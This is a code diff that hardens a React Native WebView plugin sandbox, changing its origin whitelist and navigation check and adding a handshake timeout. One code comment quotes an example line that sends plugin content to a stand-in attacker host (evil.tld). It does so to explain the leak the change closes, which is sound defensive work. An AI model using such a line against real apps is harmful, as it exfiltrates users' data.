@@ -1,4 +1,4 @@
-import { useCallback, useEffect, useMemo, useRef } from "react";
+import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { WebView, type WebViewMessageEvent } from "react-native-webview";
 import { StyleSheet } from "react-native-unistyles";
 import {
@@ -9,7 +9,8 @@ import {
   type PluginHostMessage,
   type PluginSandboxProps,
 } from "./bridge";
-import { resolvePluginThemeTokens } from "./theme";
+import { usePluginThemeTokens } from "./theme";
+import { PLUGIN_READY_TIMEOUT_MS, PluginReadyTimeout } from "./sandbox-error";
 
 /**
  * In a WebView the plugin is the top-level document, so `window.parent` is the
@@ -32,24 +33,55 @@ const GUEST_MESSAGE_FORWARDER = `
 true;
 `;
 
-const ORIGIN_WHITELIST = ["about:blank"];
+/**
+ * Widening this to `*` is what narrows the hole, however wrong it reads.
+ * react-native-webview checks the whitelist *before* it calls
+ * `onShouldStartLoadWithRequest`: a non-whitelisted URL is handed to
+ * `Linking.openURL`, which opens it in the user's real browser — so
+ * `location.href = "https://evil.tld/?d=" + content` exfiltrates and our
+ * callback never runs. With `*` every navigation reaches the callback below,
+ * which is then the sole gate.
+ */
+const ORIGIN_WHITELIST = ["*"];
 
-export function PluginSandbox({ html, context, onOpenFile, onResize, testID }: PluginSandboxProps) {
+/** The plugin document itself. Anything else is a navigation we deny. */
+function isPluginDocumentUrl(url: string): boolean {
+  const normalized = url.trim().toLowerCase();
+  return normalized === "about:blank" || normalized.startsWith("data:");
+}
+
+export function PluginSandbox({ html, context, onOpenFile, testID }: PluginSandboxProps) {
   const webViewRef = useRef<WebView | null>(null);
   const readyRef = useRef(false);
-  const hasLoadedRef = useRef(false);
-  const latest = useRef({ context, onOpenFile, onResize });
+  const [handshake, setHandshake] = useState<"waiting" | "ready" | "timeout">("waiting");
+  const [attempt, setAttempt] = useState(0);
+  const themeTokens = usePluginThemeTokens();
+  const latest = useRef({ context, onOpenFile, themeTokens });
 
   useEffect(() => {
-    latest.current = { context, onOpenFile, onResize };
-  }, [context, onOpenFile, onResize]);
+    latest.current = { context, onOpenFile, themeTokens };
+  }, [context, onOpenFile, themeTokens]);
 
   const source = useMemo(() => ({ html: wrapPluginHtml(html) }), [html]);
 
   useEffect(() => {
     readyRef.current = false;
-    hasLoadedRef.current = false;
+    setHandshake("waiting");
   }, [source]);
+
+  useEffect(() => {
+    if (handshake !== "waiting") {
+      return;
+    }
+    const timer = setTimeout(() => setHandshake("timeout"), PLUGIN_READY_TIMEOUT_MS);
+    return () => clearTimeout(timer);
+  }, [handshake, attempt]);
+
+  const handleRetry = useCallback(() => {
+    readyRef.current = false;
+    setHandshake("waiting");
+    setAttempt((current) => current + 1);
+  }, []);
 
   const post = useCallback((message: PluginHostMessage) => {
     webViewRef.current?.injectJavaScript(
@@ -62,10 +94,10 @@ export function PluginSandbox({ html, context, onOpenFile, onResize, testID }: P
       handlePluginGuestMessage(event.nativeEvent.data, {
         onReady: () => {
           readyRef.current = true;
-          post(createInitMessage(latest.current.context, resolvePluginThemeTokens()));
+          setHandshake("ready");
+          post(createInitMessage(latest.current.context, latest.current.themeTokens));
         },
         onOpenFile: (input) => latest.current.onOpenFile?.(input),
-        onResize: (height) => latest.current.onResize?.(height),
       });
     },
     [post],
@@ -75,26 +107,33 @@ export function PluginSandbox({ html, context, onOpenFile, onResize, testID }: P
     if (!readyRef.current) {
       return;
     }
-    post(createUpdateMessage(context));
-  }, [context, post]);
+    post(createUpdateMessage(context, themeTokens));
+  }, [context, themeTokens, post]);
 
-  /** Navigation is locked to the initial load: nothing after it is allowed. */
-  const allowInitialLoadOnly = useCallback(() => {
-    if (hasLoadedRef.current) {
-      return false;
-    }
-    hasLoadedRef.current = true;
-    return true;
-  }, []);
+  /**
+   * Stateless on purpose: counting loads would grant the first callback
+   * invocation whatever it is, and Android does not fire this for programmatic
+   * or POST loads, so the plugin's first real navigation could be the one
+   * allowed. Judge the URL instead.
+   */
+  const allowPluginDocumentOnly = useCallback(
+    (request: { url: string }) => isPluginDocumentUrl(request.url),
+    [],
+  );
+
+  if (handshake === "timeout") {
+    return <PluginReadyTimeout onRetry={handleRetry} testID={testID} />;
+  }
 
   return (
     <WebView
+      key={attempt}
       ref={webViewRef}
       testID={testID}
       style={styles.webView}
       source={source}
       originWhitelist={ORIGIN_WHITELIST}
-      onShouldStartLoadWithRequest={allowInitialLoadOnly}
+      onShouldStartLoadWithRequest={allowPluginDocumentOnly}
       injectedJavaScriptBeforeContentLoaded={GUEST_MESSAGE_FORWARDER}
       onMessage={handleMessage}
       javaScriptEnabled
